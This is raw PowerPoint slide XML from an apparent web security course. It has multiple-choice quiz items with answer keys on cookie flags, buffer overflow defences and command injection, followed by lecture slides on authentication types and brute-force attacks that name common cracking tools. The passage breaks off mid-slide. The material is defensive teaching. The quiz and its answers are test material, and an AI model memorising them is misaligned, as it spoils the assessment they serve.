        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: b)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A0D293D0-796A-85AB-D241-074C37E33118}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Why should cookies be marked as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> and Secure?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) To improve page rendering</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) To prevent client-side access and enforce HTTPS transmission</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) To reduce memory consumption</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) To make cookies more readable</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2849737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C9367-F73E-8CEE-9787-4D313A087F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A20B99-E434-BADF-FB9B-7AECB7D6C1B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: d)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FAF8E5AD-D85B-1B45-CECE-3EFBB02AE9B6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>In preventing buffer overflow attacks, which combination is MOST effective?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>a) Logging user inputs and disabling debug mode</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>b) Encrypting data before storing in memory</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>c) Avoiding stack usage for function calls</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>d) Enforcing bounds checking, stack canaries, ASLR, and DEP together</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="758595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11383-1FE2-CF87-B592-5A3AFA2161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6DC31-13E5-39E0-6443-2635530A226C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: c)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{50F38FE8-2A44-8942-D094-7FE25D73CCCB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>What is the safest way to handle system commands in applications?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) Concatenate user input into commands directly</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) Disable command execution entirely</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) Use parameterized APIs to pass arguments safely</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) Hide commands in comments</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2816223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16627-1758-773E-1F3C-188A980051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9F3933-F15B-FF12-7F91-26062611B617}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: d)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2CD2DDBA-07CB-D031-C18D-6B803AE45A1E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Which strategy most effectively mitigates command injection attacks in web applications?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) Escaping special shell characters in user input</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) Validating input against a regex whitelist</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) Limiting application privileges at OS level</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) Avoiding shell calls entirely and using parameterized APIs or safe library functions</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2137642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E1610-DB19-6C60-91E9-2A48D4CC89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E4E4B-3C79-3C81-AEBE-E71EE37E4E00}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: a)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3AB9B781-8923-C94F-C1DC-791608A01EDC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>Which technique prevents buffer overflow exploitation?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>a) Using stack canaries and ASLR</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>b) Increasing database storage</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>c) Allowing unlimited input size</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>d) Logging plaintext passwords</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3983223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B6E31-A056-4BD1-3884-82BE59A241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735F9E-4F16-E8E2-3D57-E4E54DE47DC5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: c)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{22F31E0F-A4A5-FE19-549C-C2965B07E0F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>What is the safest way to handle system commands in applications?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) Concatenate user input into commands directly</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) Disable command execution entirely</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) Use parameterized APIs to pass arguments safely</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) Hide commands in comments</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4157121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53236-7B02-AFF0-C11F-141F3D5DDBE8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>User Authentication</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{395F71A9-E212-24D6-D41B-B394E2DF9D06}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> is the process of verifying the identity of a user before granting access to a system, application, or data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  It ensures that only the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>right person</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> is accessing the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>right resources</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Example: When you log in to Gmail, it checks if the username and password really belong to you.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Key Concepts:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Identification</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>: Who you claim to be (username/email)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>: Proving your identity (password/2FA)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Authorization</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>: What you're allowed to do (permissions)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="106195804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7D454-2C69-85BD-FE73-67A6829E2435}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Types of Authentication</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF7E1ACB-98C7-D24B-106E-3F8D3073F728}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>a) Single-Factor Authentication (SFA)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>one method</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> only (e.g., password).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Simple but weak — if the password is stolen, account is compromised.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>b) Two-Factor Authentication (2FA)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>two different methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (e.g., password + OTP sent to phone).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Adds extra security beyond just a password.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>c) Multi-Factor Authentication (MFA)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>two or more different categories</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Something you know → password, PIN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Something you have → OTP token, smart card</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Something you are → fingerprint, face recognition</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Strongest form of authentication.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="395964047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AE76D-B942-CE72-B481-A053B5BC6D0B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Brute Force</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0214631E-F6C4-A2F6-F3C7-2D68B36567ED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Attacker systematically tries all possible username–password combinations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Time-consuming, but guaranteed to succeed if no protections exist.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Automated using tools like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Hydra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Burp Suite Intruder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>John the Ripper</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  More feasible on accounts with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>weak passwords</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Often targets authentication forms, SSH, FTP, or Wi-Fi networks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Can be distributed (many machines working together → Distributed Brute Force).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>·  Detectable by </a:t>
            </a:r>
            <a:r>
